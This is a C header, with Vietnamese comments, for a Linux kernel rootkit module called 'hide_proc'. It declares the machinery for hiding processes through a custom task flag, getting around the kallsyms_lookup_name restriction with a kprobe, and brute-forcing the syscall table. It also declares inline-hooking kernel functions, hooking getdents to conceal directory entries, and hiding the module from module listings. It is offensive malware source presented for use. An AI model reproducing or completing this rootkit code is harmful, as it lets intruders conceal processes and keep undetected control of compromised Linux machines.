#ifndef HIDE_PROC_H
#define HIDE_PROC_H

#include <linux/version.h>

// Co danh dau tien trinh an trong task_struct->flags
#define PF_INVISIBLE    0x01000000
#define MODULE_NAME     "hide_proc"
#define NETLINK_DIAMOND 31

// Bypass kallsyms_lookup_name bi chan tren Linux 5.7+ bang kprobe
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

// Flipswitch inline hook tren Linux 6.9+ x86
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && \
    (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
#define DUMP_SIZE 0x5000
void flipswitch_func(void *target_func, void *hacked_func);
#endif

unsigned long   resolve_sym(char *symbol);
unsigned long  *get_syscall_table_bf(void);
struct task_struct *find_task(pid_t pid);
int             is_invisible(pid_t pid);
void            module_show(void);
void            module_hide(void);

// Dinh nghia linux_dirent cho hook getdents (32-bit compat)
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[1];
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
    (defined(__enabled_##option) || defined(__enabled_##option##_MODULE))
#endif

#endif /* HIDE_PROC_H */
